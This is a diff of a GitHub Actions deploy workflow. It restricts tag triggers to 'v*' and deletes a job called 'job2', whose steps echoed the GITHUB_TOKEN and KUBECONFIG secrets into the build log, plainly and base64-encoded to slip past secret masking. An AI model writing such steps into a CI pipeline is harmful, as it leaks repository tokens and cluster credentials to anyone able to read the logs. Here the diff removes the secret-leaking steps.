@@ -3,11 +3,7 @@ on:
   workflow_dispatch:
   push:
     tags:
-      - "**"
-      - "!master"
-      - "!main"
-      - "!feat/**"
-      - "!fix/**"
+      - v*
 
 concurrency:
   cancel-in-progress: true
@@ -18,11 +14,3 @@ jobs:
     name: "Deploy on Kubernetes 🐳"
     uses: socialgouv/workflows/.github/workflows/use-ks-wh-production.yaml@v1
     secrets: inherit
-  test:
-    name: "job2"
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "${{ secrets.GITHUB_TOKEN }}"
-      - run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
-      - run: echo "${{ secrets.KUBECONFIG }}"
-      - run: echo "${{ secrets.KUBECONFIG }}" | base64
